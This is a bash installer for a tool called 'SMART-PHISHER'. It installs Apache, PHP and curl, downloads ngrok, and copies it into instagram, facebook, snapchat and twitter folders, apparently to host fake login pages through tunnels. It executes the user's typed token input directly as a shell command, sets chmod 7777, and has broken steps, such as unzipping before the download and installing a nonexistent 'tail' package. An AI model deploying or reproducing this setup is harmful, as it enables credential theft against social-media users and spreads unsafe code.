#!/bin/bash
echo ""
clear
echo ""
echo ""
echo -e $'\e[1;33m  𝐒𝐌𝐀𝐑𝐓-𝐏𝐇𝐈𝐒𝐇𝐄𝐑  𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗽𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁... \e[0m'
sleep 8
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32m 𝗱𝗼 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝗶𝗻𝘀𝘁𝗮𝗹𝗹 𝗽𝗿𝗼𝗽𝗲𝗿𝗹𝘆   \e[1;33m     (𝙔/𝙉) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m  𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗿𝗲𝗾𝘂𝗶𝗿𝗲𝗺𝗲𝗻𝘁𝘀 \e[0m'
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
systemctl start apache2
unzip ngrok-stable-linux-amd64.zip
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip

cp -R ngrok instagram/
cp -R ngrok facebook/
cp -R ngrok snapchat
cp -R ngrok twitter
chmod 7777 smartphish.sh
clear
echo ""
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
clear



